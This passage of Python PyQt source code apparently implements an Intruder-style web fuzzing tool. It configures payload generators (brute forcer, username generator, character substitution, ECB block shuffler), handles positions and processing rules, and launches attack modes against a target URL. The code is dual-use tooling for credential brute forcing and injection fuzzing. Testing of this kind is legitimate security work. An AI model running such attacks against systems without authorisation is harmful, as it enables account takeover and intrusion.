        f1 = QFormLayout()
        self.intr_retries = QSpinBox()
        self.intr_retries.setRange(0, 10)
        f1.addRow("Retries on network failure:", self.intr_retries)
        self.intr_retry_pause = QSpinBox()
        self.intr_retry_pause.setRange(0, 10000)
        self.intr_retry_pause.setSuffix(" ms")
        self.intr_retry_pause.setValue(500)
        f1.addRow("Pause before retry:", self.intr_retry_pause)
        v.addLayout(f1)

        v.addWidget(self._intr_section_label("Attack results"))
        self.intr_store_resp_chk = QCheckBox("Store responses")
        self.intr_store_resp_chk.setChecked(True)
        self.intr_store_full_chk = QCheckBox("Store full response body")
        self.intr_store_full_chk.setChecked(True)
        self.intr_baseline_chk = QCheckBox("Make unmodified baseline request")
        self.intr_baseline_chk.setToolTip(
            "Send one extra request using the ORIGINAL values (no payloads) first, "
            "so you have something to compare every attack result against.")
        v.addWidget(self.intr_store_resp_chk)
        v.addWidget(self.intr_store_full_chk)
        v.addWidget(self.intr_baseline_chk)

        v.addWidget(self._intr_section_label("Grep match"))
        f2 = QFormLayout()
        self.intr_grep = QLineEdit()
        self.intr_grep.setPlaceholderText(r'e.g. "Welcome back" or \bsuccess\b')
        f2.addRow("Flag responses containing:", self.intr_grep)
        v.addLayout(f2)
        self.intr_grep_regex_chk = QCheckBox("Treat as regex")
        v.addWidget(self.intr_grep_regex_chk)

        v.addStretch()
        return w

    # ---------- Intruder: payload-position management ----------
    def _intr_save_current_position(self):
        if not hasattr(self, 'intr_payload_list'):
            return
        values = [self.intr_payload_list.item(i).text()
                  for i in range(self.intr_payload_list.count())]
        rules = self._intr_get_rules()
        self._intr_payload_sets[self._intr_current_pos] = {"values": values, "rules": rules}

    def _intr_load_position(self, idx: int):
        data = self._intr_payload_sets.get(idx, {"values": [], "rules": []})
        self.intr_payload_list.blockSignals(True)
        self.intr_payload_list.clear()
        for val in data.get("values", []):
            self.intr_payload_list.addItem(val)
        self.intr_payload_list.blockSignals(False)
        self._intr_set_rules(data.get("rules", []))
        self._intr_current_pos = idx
        self._intr_update_counts()

    def _intr_position_changed(self, combo_idx: int):
        if combo_idx < 0:
            return
        self._intr_save_current_position()
        self._intr_load_position(combo_idx)

    def _intr_refresh_position_combo(self):
        if not hasattr(self, 'intr_pos_combo'):
            return
        n_pos = max(len(re.findall(r'§[^§]*§', self.intr_headers.toPlainText())) +
                    len(re.findall(r'§[^§]*§', self.intr_body.toPlainText())), 1)
        mode = self.intr_mode.currentText()
        multi = mode in (IntruderAttack.PITCHFORK, IntruderAttack.CLUSTER_BOMB)
        self.intr_pos_row.setVisible(multi)
        if not multi:
            return
        self._intr_save_current_position()
        cur = min(self._intr_current_pos, n_pos - 1)
        self.intr_pos_combo.blockSignals(True)
        self.intr_pos_combo.clear()
        for i in range(n_pos):
            self.intr_pos_combo.addItem(f"Payload set {i + 1} of {n_pos}")
        self.intr_pos_combo.setCurrentIndex(max(cur, 0))
        self.intr_pos_combo.blockSignals(False)
        self._intr_load_position(max(cur, 0))

    # ---------- Intruder: payload list editing ----------
    def _intr_add_from_preset_list(self):
        """'Add from list…' — append a built-in preset word list (SQLi, XSS,
        common passwords, etc.) to the current payload list."""
        cat = self.intr_addlist_combo.currentText()
        vals = Payloads.categories().get(cat, [])
        for v in vals:
            self.intr_payload_list.addItem(v)
        self._intr_update_counts()
        self._log(f"Added preset list '{cat}' ({len(vals)} payloads)")

    def _intr_clear_ptype_config(self):
        while self.intr_ptype_config_layout.count():
            item = self.intr_ptype_config_layout.takeAt(0)
            wgt = item.widget()
            if wgt:
                wgt.deleteLater()
        self._intr_ptype_fields = {}

    def _intr_cfg_row(self, label: str, widget: QWidget) -> QHBoxLayout:
        row = QHBoxLayout()
        lbl = QLabel(label)
        lbl.setFixedWidth(90)
        lbl.setStyleSheet(f"color:{T.TXT2};font-size:11px;")
        row.addWidget(lbl)
        row.addWidget(widget, 1)
        return row

    def _intr_ptype_changed(self, cat: str):
        self._intr_clear_ptype_config()
        simple = cat in INTRUDER_SIMPLE_TYPES
        self.intr_ptype_config_box.setVisible(not simple)
        self.intr_generate_btn.setVisible(not simple)
        if simple:
            return

        f = self._intr_ptype_fields
        L = self.intr_ptype_config_layout

        if cat == "Runtime file":
            f["path"] = QLineEdit(); f["path"].setPlaceholderText("Path to wordlist file…")
            b = self._btn("Browse…", h=24)
            def _pick():
                p, _ = QFileDialog.getOpenFileName(self, "Choose runtime file", "", "Text (*.txt);;All (*)")
                if p: f["path"].setText(p)
            b.clicked.connect(_pick)
            row = QHBoxLayout(); row.addWidget(f["path"], 1); row.addWidget(b)
            L.addLayout(row)
            L.addWidget(QLabel("File is read into the payload list below on Generate."))

        elif cat == "Custom iterator":
            f["groups"] = QPlainTextEdit(); f["groups"].setFixedHeight(60)
            f["groups"].setPlaceholderText("One group per line, comma-separated values\ne.g. admin,root\n1,2,3")
            f["sep"] = QLineEdit(""); f["sep"].setPlaceholderText("separator (default: empty)")
            L.addWidget(f["groups"])
            L.addLayout(self._intr_cfg_row("Separator:", f["sep"]))

        elif cat == "Character substitution":
            f["words"] = QPlainTextEdit(); f["words"].setFixedHeight(50)
            f["words"].setPlaceholderText("Base words, one per line (e.g. password)")
            f["subs"] = QLineEdit("a=@,e=3,i=1,o=0,s=$")
            L.addWidget(f["words"])
            L.addLayout(self._intr_cfg_row("Substitutions:", f["subs"]))

        elif cat == "Case modification":
            f["words"] = QPlainTextEdit(); f["words"].setFixedHeight(50)
            f["words"].setPlaceholderText("Base words, one per line")
            f["lower"] = QCheckBox("lowercase"); f["lower"].setChecked(True)
            f["upper"] = QCheckBox("UPPERCASE"); f["upper"].setChecked(True)
            f["capitalize"] = QCheckBox("Capitalize"); f["capitalize"].setChecked(True)
            f["invert"] = QCheckBox("iNVERT CASE")
            f["random"] = QCheckBox("rAnDoM CaSe")
            L.addWidget(f["words"])
            row1 = QHBoxLayout()
            for k in ("lower","upper","capitalize"): row1.addWidget(f[k])
            row2 = QHBoxLayout()
            for k in ("invert","random"): row2.addWidget(f[k])
            L.addLayout(row1); L.addLayout(row2)

        elif cat == "Recursive grep":
            f["seed"] = QLineEdit(); f["seed"].setPlaceholderText("Seed regex to extract from each response")
            L.addLayout(self._intr_cfg_row("Grep regex:", f["seed"]))
            note = QLabel("Re-uses text captured from each response as the next\n"
                           "request's payload. Configure the grep pattern, then run\n"
                           "the attack — this list is only a seed value.")
            note.setStyleSheet(f"color:{T.TXT3};font-size:10px;")
            L.addWidget(note)

        elif cat == "Illegal Unicode":
            note = QLabel("Generates a curated set of illegal / overlong / control\nUnicode sequences.")
            note.setStyleSheet(f"color:{T.TXT3};font-size:10px;")
            L.addWidget(note)

        elif cat == "Character blocks":
            f["char"] = QLineEdit("A"); f["char"].setFixedWidth(30)
            f["start"] = QSpinBox(); f["start"].setRange(1, 100000); f["start"].setValue(1)
            f["end"] = QSpinBox(); f["end"].setRange(1, 100000); f["end"].setValue(100)
            f["step"] = QSpinBox(); f["step"].setRange(1, 10000); f["step"].setValue(10)
            L.addLayout(self._intr_cfg_row("Character:", f["char"]))
            L.addLayout(self._intr_cfg_row("Start len:", f["start"]))
            L.addLayout(self._intr_cfg_row("End len:", f["end"]))
            L.addLayout(self._intr_cfg_row("Step:", f["step"]))

        elif cat == "Numbers":
            f["frm"] = QLineEdit("1"); f["to"] = QLineEdit("100"); f["step"] = QLineEdit("1")
            f["fmt"] = QComboBox(); f["fmt"].addItems(["Decimal","Hexadecimal","Octal","Float"])
            f["digits"] = QSpinBox(); f["digits"].setRange(0, 20); f["digits"].setValue(0)
            L.addLayout(self._intr_cfg_row("From:", f["frm"]))
            L.addLayout(self._intr_cfg_row("To:", f["to"]))
            L.addLayout(self._intr_cfg_row("Step:", f["step"]))
            L.addLayout(self._intr_cfg_row("Format:", f["fmt"]))
            L.addLayout(self._intr_cfg_row("Min digits:", f["digits"]))

        elif cat == "Dates":
            today = datetime.date.today()
            f["frm"] = QLineEdit(today.strftime("%Y-%m-%d"))
            f["to"] = QLineEdit((today + datetime.timedelta(days=30)).strftime("%Y-%m-%d"))
            f["step"] = QSpinBox(); f["step"].setRange(1, 3650); f["step"].setValue(1)
            f["fmt"] = QLineEdit("%Y-%m-%d")
            L.addLayout(self._intr_cfg_row("From (YYYY-MM-DD):", f["frm"]))
            L.addLayout(self._intr_cfg_row("To (YYYY-MM-DD):", f["to"]))
            L.addLayout(self._intr_cfg_row("Step (days):", f["step"]))
            L.addLayout(self._intr_cfg_row("strftime fmt:", f["fmt"]))

        elif cat == "Brute forcer":
            f["charset"] = QLineEdit("abcdefghijklmnopqrstuvwxyz0123456789")
            f["minlen"] = QSpinBox(); f["minlen"].setRange(1, 12); f["minlen"].setValue(1)
            f["maxlen"] = QSpinBox(); f["maxlen"].setRange(1, 12); f["maxlen"].setValue(3)
            L.addLayout(self._intr_cfg_row("Char set:", f["charset"]))
            L.addLayout(self._intr_cfg_row("Min length:", f["minlen"]))
            L.addLayout(self._intr_cfg_row("Max length:", f["maxlen"]))
            L.addWidget(QLabel("Capped at 20,000 combinations."))

        elif cat == "Null payloads":
            f["count"] = QSpinBox(); f["count"].setRange(1, 10000); f["count"].setValue(10)
            f["value"] = QLineEdit(""); f["value"].setPlaceholderText("payload value (default: empty)")
            L.addLayout(self._intr_cfg_row("Count:", f["count"]))
            L.addLayout(self._intr_cfg_row("Value:", f["value"]))

        elif cat == "Character frobber":
            f["base"] = QLineEdit("password")
            f["alphabet"] = QLineEdit("abcdefghijklmnopqrstuvwxyz0123456789")
            L.addLayout(self._intr_cfg_row("Base value:", f["base"]))
            L.addLayout(self._intr_cfg_row("Alphabet:", f["alphabet"]))
            L.addWidget(QLabel("Flips one character at a time through the alphabet."))

        elif cat == "Bit flipper":
            f["base"] = QLineEdit("password")
            f["mode"] = QComboBox(); f["mode"].addItems(["Text","Hex"])
            L.addLayout(self._intr_cfg_row("Base value:", f["base"]))
            L.addLayout(self._intr_cfg_row("Input type:", f["mode"]))
            L.addWidget(QLabel("Flips each bit of each byte → hex-encoded output."))

        elif cat == "Username generator":
            f["firsts"] = QPlainTextEdit(); f["firsts"].setFixedHeight(50)
            f["firsts"].setPlaceholderText("First names, one per line")
            f["lasts"] = QPlainTextEdit(); f["lasts"].setFixedHeight(50)
            f["lasts"].setPlaceholderText("Last names, one per line (optional)")
            L.addWidget(QLabel("First names:")); L.addWidget(f["firsts"])
            L.addWidget(QLabel("Last names:")); L.addWidget(f["lasts"])

        elif cat == "ECB block shuffler":
            f["data"] = QLineEdit(); f["data"].setPlaceholderText("Ciphertext, hex-encoded")
            f["block"] = QSpinBox(); f["block"].setRange(1, 64); f["block"].setValue(16)
            L.addLayout(self._intr_cfg_row("Hex data:", f["data"]))
            L.addLayout(self._intr_cfg_row("Block size:", f["block"]))
            L.addWidget(QLabel("Generates pairwise block-swapped variants for ECB tampering tests."))

        elif cat == "Extension-generated":
            note = QLabel("This payload type normally calls a loaded Burp extension's\n"
                           "payload generator. No extension hook is available in this\n"
                           "build — load payloads manually or use another type.")
            note.setStyleSheet(f"color:{T.YELLOW};font-size:10px;")
            note.setWordWrap(True)
            L.addWidget(note)

        elif cat == "Copy other payload":
            f["source"] = QComboBox()
            for i in range(self.intr_pos_combo.count()):
                f["source"].addItem(self.intr_pos_combo.itemText(i) or f"Payload set {i+1}", i)
            if f["source"].count() == 0:
                f["source"].addItem("Payload set 1", 0)
            L.addLayout(self._intr_cfg_row("Copy from:", f["source"]))

    def _intr_generate_from_type(self):
        cat = self.intr_ptype.currentText()
        f = self._intr_ptype_fields
        vals: List[str] = []
        try:
            if cat == "Runtime file":
                path = f["path"].text().strip()
                if path and os.path.isfile(path):
                    with open(path, 'r', errors='replace') as fh:
                        vals = [ln.rstrip('\r\n') for ln in fh if ln.strip()][:20000]
                else:
                    QMessageBox.warning(self, "Runtime file", "Choose a valid file first.")
                    return

            elif cat == "Custom iterator":
                groups = [[x.strip() for x in ln.split(',') if x.strip()]
                          for ln in f["groups"].toPlainText().split('\n') if ln.strip()]
                vals = PayloadGenerators.custom_iterator(groups, f["sep"].text())

            elif cat == "Character substitution":
                words = [w for w in f["words"].toPlainText().split('\n') if w.strip()]
                sub_map = {}
                for pair in f["subs"].text().split(','):
                    if '=' in pair:
                        k, v = pair.split('=', 1)
                        if k:
                            sub_map[k] = v
                vals = PayloadGenerators.character_substitution(words, sub_map)

            elif cat == "Case modification":
                words = [w for w in f["words"].toPlainText().split('\n') if w.strip()]
                opts = {k: f[k].isChecked() for k in ("lower","upper","capitalize","invert","random")}
                vals = PayloadGenerators.case_modification(words, opts)

            elif cat == "Recursive grep":
                seed = f["seed"].text().strip()
                vals = [seed] if seed else []
                self._log("Recursive grep configured — seed pattern stored; "
                           "live extraction happens during the attack run.")

            elif cat == "Illegal Unicode":
                vals = PayloadGenerators.illegal_unicode()

            elif cat == "Character blocks":
                vals = PayloadGenerators.character_blocks(
                    f["char"].text(), f["start"].value(), f["end"].value(), f["step"].value())

            elif cat == "Numbers":
                vals = PayloadGenerators.numbers(
                    float(f["frm"].text() or 0), float(f["to"].text() or 0),
                    float(f["step"].text() or 1), f["fmt"].currentText(), f["digits"].value())

            elif cat == "Dates":
                vals = PayloadGenerators.dates(
                    f["frm"].text().strip(), f["to"].text().strip(),
                    f["step"].value(), f["fmt"].text() or "%Y-%m-%d")

            elif cat == "Brute forcer":
                vals = PayloadGenerators.brute_forcer(
                    f["charset"].text(), f["minlen"].value(), f["maxlen"].value())

            elif cat == "Null payloads":
                vals = PayloadGenerators.null_payloads(f["count"].value(), f["value"].text())

            elif cat == "Character frobber":
                vals = PayloadGenerators.character_frobber(f["base"].text(), f["alphabet"].text())

            elif cat == "Bit flipper":
                raw = f["base"].text()
                base_bytes = bytes.fromhex(raw) if f["mode"].currentText() == "Hex" else raw.encode('utf-8','replace')
                vals = PayloadGenerators.bit_flipper(base_bytes)

            elif cat == "Username generator":
                firsts = [x for x in f["firsts"].toPlainText().split('\n') if x.strip()]
                lasts = [x for x in f["lasts"].toPlainText().split('\n') if x.strip()]
                vals = PayloadGenerators.username_generator(firsts, lasts)

            elif cat == "ECB block shuffler":
                hexdata = f["data"].text().strip()
                if not hexdata:
                    QMessageBox.warning(self, "ECB block shuffler", "Enter hex-encoded ciphertext first.")
                    return
                vals = PayloadGenerators.ecb_block_shuffler(bytes.fromhex(hexdata), f["block"].value())

            elif cat == "Extension-generated":
                QMessageBox.information(self, "Extension-generated",
                    "No extension hook is available in this build.")
                return

            elif cat == "Copy other payload":
                src_idx = f["source"].currentData()
                data = self._intr_payload_sets.get(src_idx, {"values": []})
                vals = list(data.get("values", []))

        except Exception as ex:
            QMessageBox.warning(self, "Generate payload list", f"Couldn't generate payloads: {ex}")
            return

        self.intr_payload_list.clear()
        for v in vals:
            self.intr_payload_list.addItem(v)
        self._intr_update_counts()
        self._log(f"Generated '{cat}' payload list ({len(vals)} payloads)")

    def _intr_paste_payloads(self):
        text = QApplication.clipboard().text()
        if not text.strip():
            return
        for line in text.split('\n'):
            if line.strip():
                self.intr_payload_list.addItem(line.rstrip('\r'))
        self._intr_update_counts()

    def _intr_load_payloads_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "Load Payloads", "", "Text (*.txt);;All (*)")
        if not path:
            return
        with open(path, 'r', errors='replace') as f:
            for line in f:
                line = line.rstrip('\n\r')
                if line:
                    self.intr_payload_list.addItem(line)
        self._intr_update_counts()
        self._log(f"Loaded payloads from {path}")

    def _intr_remove_selected_payloads(self):
        for item in self.intr_payload_list.selectedItems():
            self.intr_payload_list.takeItem(self.intr_payload_list.row(item))
        self._intr_update_counts()

    def _intr_clear_payloads(self):
        self.intr_payload_list.clear()
        self._intr_update_counts()

    def _intr_dedupe_payloads(self):
        seen = set()
        kept = []
        for i in range(self.intr_payload_list.count()):
            t = self.intr_payload_list.item(i).text()
            if t not in seen:
                seen.add(t)
                kept.append(t)
        removed = self.intr_payload_list.count() - len(kept)
        self.intr_payload_list.clear()
        for t in kept:
            self.intr_payload_list.addItem(t)
        self._intr_update_counts()
        if removed:
            self._log(f"Deduplicated: removed {removed} duplicate payload(s)")

    def _intr_add_single_payload(self):
        text = self.intr_add_item_edit.text()
        if text:
            self.intr_payload_list.addItem(text)
            self.intr_add_item_edit.clear()
            self._intr_update_counts()

    def _intr_update_counts(self):
        if not hasattr(self, 'intr_payload_list'):
            return
        n = self.intr_payload_list.count()
        self.intr_payload_count_lbl.setText(f"Payload count: {n}")
        n_pos = max(len(re.findall(r'§[^§]*§', self.intr_headers.toPlainText())) +
                    len(re.findall(r'§[^§]*§', self.intr_body.toPlainText())), 1) \
            if hasattr(self, 'intr_headers') else 1
        mode = self.intr_mode.currentText() if hasattr(self, 'intr_mode') else IntruderAttack.SNIPER
        if mode == IntruderAttack.SNIPER:
            req_count = n * n_pos
        elif mode == IntruderAttack.BATTERING:
            req_count = n
        elif mode in (IntruderAttack.PITCHFORK, IntruderAttack.CLUSTER_BOMB):
            snapshot = dict(self._intr_payload_sets)
            snapshot[self._intr_current_pos] = {
                "values": [self.intr_payload_list.item(i).text()
                          for i in range(self.intr_payload_list.count())],
                "rules": self._intr_get_rules(),
            }
            counts = [len(snapshot.get(i, {}).get('values', [])) for i in range(n_pos)]
            active = [c for c in counts if c]
            if mode == IntruderAttack.PITCHFORK:
                req_count = min(active) if active else 0
            else:
                req_count = 1
                for c in counts:
                    if c:
                        req_count *= c
                if not active:
                    req_count = 0
        else:
            req_count = n
        self.intr_request_count_lbl.setText(f"Request count: {req_count}")

    # ---------- Intruder: payload processing rules ----------
    RULE_LABELS = {
        'prefix': 'Add prefix', 'suffix': 'Add suffix',
        'upper': 'Convert to UPPERCASE', 'lower': 'Convert to lowercase',
        'urlencode': 'URL-encode', 'urldecode': 'URL-decode',
        'b64encode': 'Base64-encode', 'b64decode': 'Base64-decode',
        'md5': 'Hash: MD5', 'sha256': 'Hash: SHA-256',
        'replace': 'Match/Replace (regex)',
    }

    def _intr_rule_desc(self, rule: dict) -> str:
        t = rule.get('type', '')
        label = self.RULE_LABELS.get(t, t)
        if t in ('prefix', 'suffix'):
            return f'{label}: "{rule.get("arg", "")}"'
        if t == 'replace':
            return f'{label}: /{rule.get("pattern", "")}/ → "{rule.get("repl", "")}"'
        return label

    def _intr_rule_dialog(self, existing: dict = None) -> Optional[dict]:
        dlg = QDialog(self)
        dlg.setWindowTitle("Payload Processing Rule")
        dlg.setFixedWidth(380)
        dv = QVBoxLayout(dlg)
        type_combo = QComboBox()
        for k, lbl in self.RULE_LABELS.items():
            type_combo.addItem(lbl, k)
        dv.addWidget(QLabel("Rule type:"))
        dv.addWidget(type_combo)

        arg_row = QWidget()
        arg_l = QVBoxLayout(arg_row)
        arg_l.setContentsMargins(0, 8, 0, 0)
        arg_edit = QLineEdit()
        arg_l.addWidget(QLabel("Value:"))
        arg_l.addWidget(arg_edit)

        replace_row = QWidget()
        rl = QVBoxLayout(replace_row)
        rl.setContentsMargins(0, 8, 0, 0)
        pattern_edit = QLineEdit()
        repl_edit = QLineEdit()
        rl.addWidget(QLabel("Match pattern (regex):"))
        rl.addWidget(pattern_edit)
        rl.addWidget(QLabel("Replace with:"))
        rl.addWidget(repl_edit)

        dv.addWidget(arg_row)
        dv.addWidget(replace_row)

        def _sync_visibility():
            t = type_combo.currentData()
            arg_row.setVisible(t in ('prefix', 'suffix'))
            replace_row.setVisible(t == 'replace')
        type_combo.currentIndexChanged.connect(_sync_visibility)

        if existing:
            idx = type_combo.findData(existing.get('type'))
            if idx >= 0:
                type_combo.setCurrentIndex(idx)
            arg_edit.setText(existing.get('arg', ''))
            pattern_edit.setText(existing.get('pattern', ''))
            repl_edit.setText(existing.get('repl', ''))
        _sync_visibility()

        bb = QDialogButtonBox(QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel)
        bb.accepted.connect(dlg.accept)
        bb.rejected.connect(dlg.reject)
        dv.addWidget(bb)

        if dlg.exec() != QDialog.DialogCode.Accepted:
            return None
        t = type_combo.currentData()
        rule = {"type": t}
        if t in ('prefix', 'suffix'):
            rule['arg'] = arg_edit.text()
        if t == 'replace':
            rule['pattern'] = pattern_edit.text()
            rule['repl'] = repl_edit.text()
        return rule

    def _intr_rules_row_widget(self, checked: bool = True) -> QWidget:
        cw = QWidget()
        cl = QHBoxLayout(cw)
        cl.setContentsMargins(0, 0, 0, 0)
        chk = QCheckBox()
        chk.setChecked(checked)
        cl.addWidget(chk)
        cl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        return cw

    def _intr_add_rule(self):
        rule = self._intr_rule_dialog()
        if not rule:
            return
        row = self.intr_rules_tbl.rowCount()
        self.intr_rules_tbl.insertRow(row)
        self.intr_rules_tbl.setCellWidget(row, 0, self._intr_rules_row_widget())
        item = QTableWidgetItem(self._intr_rule_desc(rule))
        item.setData(Qt.ItemDataRole.UserRole, rule)
        self.intr_rules_tbl.setItem(row, 1, item)

    def _intr_edit_rule(self):
        row = self.intr_rules_tbl.currentRow()
        if row < 0:
            return
        item = self.intr_rules_tbl.item(row, 1)
        existing = item.data(Qt.ItemDataRole.UserRole)
        rule = self._intr_rule_dialog(existing)
        if not rule:
            return
        item.setText(self._intr_rule_desc(rule))
        item.setData(Qt.ItemDataRole.UserRole, rule)

    def _intr_remove_rule(self):
        row = self.intr_rules_tbl.currentRow()
        if row >= 0:
            self.intr_rules_tbl.removeRow(row)

    def _intr_move_rule(self, direction: int):
        row = self.intr_rules_tbl.currentRow()
        new_row = row + direction
        if row < 0 or new_row < 0 or new_row >= self.intr_rules_tbl.rowCount():
            return
        cw1 = self.intr_rules_tbl.cellWidget(row, 0)
        cw2 = self.intr_rules_tbl.cellWidget(new_row, 0)
        chk1 = cw1.findChild(QCheckBox) if cw1 else None
        chk2 = cw2.findChild(QCheckBox) if cw2 else None
        if chk1 and chk2:
            a, b = chk1.isChecked(), chk2.isChecked()
            chk1.setChecked(b)
            chk2.setChecked(a)
        it1 = self.intr_rules_tbl.takeItem(row, 1)
        it2 = self.intr_rules_tbl.takeItem(new_row, 1)
        self.intr_rules_tbl.setItem(row, 1, it2)
        self.intr_rules_tbl.setItem(new_row, 1, it1)
        self.intr_rules_tbl.setCurrentCell(new_row, 1)

    def _intr_get_rules(self) -> List[dict]:
        rules = []
        for row in range(self.intr_rules_tbl.rowCount()):
            cw = self.intr_rules_tbl.cellWidget(row, 0)
            chk = cw.findChild(QCheckBox) if cw else None
            if chk and not chk.isChecked():
                continue
            item = self.intr_rules_tbl.item(row, 1)
            if item:
                rule = item.data(Qt.ItemDataRole.UserRole)
                if rule:
                    rules.append(rule)
        return rules

    def _intr_set_rules(self, rules: List[dict]):
        self.intr_rules_tbl.setRowCount(0)
        for rule in rules:
            row = self.intr_rules_tbl.rowCount()
            self.intr_rules_tbl.insertRow(row)
            self.intr_rules_tbl.setCellWidget(row, 0, self._intr_rules_row_widget())
            item = QTableWidgetItem(self._intr_rule_desc(rule))
            item.setData(Qt.ItemDataRole.UserRole, rule)
            self.intr_rules_tbl.setItem(row, 1, item)

    # ---------- Intruder: mode / marker-count hooks ----------
    def _on_intr_mode_change(self, mode: str):
        descs = {
            IntruderAttack.SNIPER: "One payload set, inserted into each position in turn — one position targeted per request, others keep their original value.",
            IntruderAttack.BATTERING: "One payload set; the SAME value is inserted into every position simultaneously.",
            IntruderAttack.PITCHFORK: "One payload set per position, iterated in parallel — stops at the shortest list.",
            IntruderAttack.CLUSTER_BOMB: "One payload set per position — every combination is tried (cartesian product).",
        }
        self.mode_desc.setText(descs.get(mode, ""))
        if hasattr(self, 'intr_pos_combo'):
            self._intr_refresh_position_combo()
            self._intr_update_counts()

    def _start_intruder(self):
        url = self.intr_url.text().strip()
        if not url:
            QMessageBox.warning(self, "Intruder", "Enter a target URL first.")
            return
        if not HAS_REQUESTS:
            QMessageBox.warning(self, "Missing dependency", "pip install requests")
            return

        self._intr_save_current_position()
        mode = self.intr_mode.currentText()
        n_pos = max(len(re.findall(r'§[^§]*§', self.intr_headers.toPlainText())) +
                    len(re.findall(r'§[^§]*§', self.intr_body.toPlainText())), 1)

        payload_sets = [self._intr_payload_sets.get(i, {"values": [], "rules": []})
                        for i in range(n_pos)]
        if mode in (IntruderAttack.SNIPER, IntruderAttack.BATTERING):
            if not payload_sets or not payload_sets[0].get('values'):
                QMessageBox.warning(self, "Intruder", "Add at least one payload.")
                return
        else:
            if not any(s.get('values') for s in payload_sets):
                QMessageBox.warning(self, "Intruder", "Add at least one payload to at least one position.")
                return

        throttle_codes = []
        if self.intr_throttle_429.isChecked():
            throttle_codes.append(429)
        if self.intr_throttle_503.isChecked():
            throttle_codes.append(503)
        for tok in self.intr_throttle_other.text().split(','):
            tok = tok.strip()
            if tok.isdigit():
                throttle_codes.append(int(tok))

        jitter_ms = self.intr_delay_jitter.value() if self.intr_delay_jitter_rb.isChecked() else 0

        self._intr_attack_counter += 1
        n_positions_for_dialog = n_pos

        self.intr_start.setEnabled(False)
        self.intr_stop.setEnabled(True)
        self.intr_prog.setVisible(True)
        self.intr_prog.setValue(0)
        self.intr_status_lbl.setText("Running…")

        self._intruder = IntruderAttack(
            mode=mode, url=url, method=self.intr_method.currentText(),
            headers_text=self.intr_headers.toPlainText(),
            template=self.intr_body.toPlainText(),
            payload_sets=payload_sets,
            concurrency=self.intr_conc.value(),
            delay_ms=self.intr_delay.value(), delay_jitter_ms=jitter_ms,
            retries=self.intr_retries.value(), retry_pause_ms=self.intr_retry_pause.value(),
            update_cl=self.intr_update_cl_chk.isChecked(),
            set_connection=self.intr_set_conn_chk.isChecked(),
            throttle_codes=throttle_codes, throttle_extra_ms=self.intr_throttle_extra.value(),
            store_responses=self.intr_store_resp_chk.isChecked(),
            store_full_body=self.intr_store_full_chk.isChecked(),
            baseline=self.intr_baseline_chk.isChecked(),
            grep_pattern=self.intr_grep.text().strip(),
            grep_regex=self.intr_grep_regex_chk.isChecked(),
            encode_chars=(self.intr_encode_chars.text() if self.intr_encode_chk.isChecked() else ""),
        )

        dlg_info = self._intr_open_results_dialog(
            self._intr_attack_counter, url, n_positions_for_dialog,
            self.intr_headers.toPlainText(), self.intr_body.toPlainText(),
            self._intruder)
        self._intr_active_dialog = dlg_info
        self.intr_view_results_btn.setEnabled(True)

        self._intruder.result.connect(lambda r: self._intr_add_result_row(dlg_info, r))
        self._intruder.progress.connect(lambda d, t: self._intr_on_progress(dlg_info, d, t))
        self._intruder.finished.connect(lambda msg: self._intr_on_finished(dlg_info, msg))
        self._intruder.start()
        self._log(f"Intruder [{mode}] → {url} ({n_pos} position(s))")

    def _stop_intruder(self):
        if self._intruder:
            self._intruder.stop()
        self.intr_start.setEnabled(True)
        self.intr_stop.setEnabled(False)
        self.intr_status_lbl.setText("Stopped")

    def _intr_show_active_dialog(self):
        if self._intr_active_dialog:
            dlg = self._intr_active_dialog['dialog']
            dlg.show()
            dlg.raise_()
            dlg.activateWindow()

    # ---------- Intruder: dedicated results window (Burp-style) ----------
    def _intr_open_results_dialog(self, attack_num, url, n_positions,
                                  headers_snapshot, body_snapshot, engine):
        dlg = QDialog(self)
        dlg.setWindowFlags(Qt.WindowType.Window)
        display_url = url if len(url) <= 90 else url[:87] + "…"
        dlg.setWindowTitle(f"{attack_num}. Intruder attack of {display_url}")
        dlg.resize(1000, 580)
        dlg.setStyleSheet(f"background:{T.BG};color:{T.TXT1};")

        root_l = QVBoxLayout(dlg)
        root_l.setContentsMargins(8, 8, 8, 8)
        root_l.setSpacing(6)

        tb = QHBoxLayout()
        repeat_btn = self._btn("↺ Repeat Attack", "primary", h=28)
        export_btn = self._btn("📄 Export CSV", h=28)
        search_edit = QLineEdit()
        search_edit.setPlaceholderText("🔍 Filter results…")
        search_edit.setFixedHeight(28)
        tb.addWidget(repeat_btn)
        tb.addWidget(export_btn)
        tb.addWidget(search_edit, 1)
        root_l.addLayout(tb)

        tabs = QTabWidget()
        root_l.addWidget(tabs, 1)

        res_w = QWidget()
        rv = QVBoxLayout(res_w)
        rv.setContentsMargins(0, 0, 0, 0)
        cols = (["Req#"] + [f"Payload {i + 1}" for i in range(n_positions)] +
                ["Status", "Time (ms)", "Length", "Grep", "Error", "Comment"])
        tbl = QTableWidget(0, len(cols))
        tbl.setHorizontalHeaderLabels(cols)
        tbl.setSortingEnabled(True)
        tbl.setAlternatingRowColors(True)
        tbl.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        tbl.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        tbl.horizontalHeader().setStretchLastSection(True)
        rv.addWidget(tbl)
        tabs.addTab(res_w, "Results")

        pos_view = QPlainTextEdit()
        pos_view.setReadOnly(True)
        pos_view.setFont(mono_font(10))
        snapshot = headers_snapshot + ("\n\n" if headers_snapshot.strip() else "") + body_snapshot
        pos_view.setPlainText(snapshot)
        HTTPHighlighter(pos_view.document())
        IntruderMarkerHighlighter(pos_view.document())
        tabs.addTab(pos_view, "Positions")

        resp_prev = QPlainTextEdit()
        resp_prev.setReadOnly(True)
        resp_prev.setFont(mono_font(10))
        resp_prev.setMaximumHeight(160)
        resp_prev.setPlaceholderText("Click a result row to preview its response…")
        HTTPHighlighter(resp_prev.document())
        root_l.addWidget(resp_prev)

        status_row = QHBoxLayout()
        prog = QProgressBar()
        prog.setFixedHeight(16)
        status_lbl = QLabel("Running…")
        status_lbl.setStyleSheet(f"color:{T.TXT2};font-size:11px;")
        status_row.addWidget(prog, 1)
        status_row.addWidget(status_lbl)
        root_l.addLayout(status_row)

        row_data = {}

        def _on_cell_click(r, _c):
            data = row_data.get(r, {})
            resp_prev.setPlainText(data.get('response', '') or '(no response body)')
        tbl.cellClicked.connect(_on_cell_click)

        def _apply_filter(text):
            text = text.lower()
            for row in range(tbl.rowCount()):
                if not text:
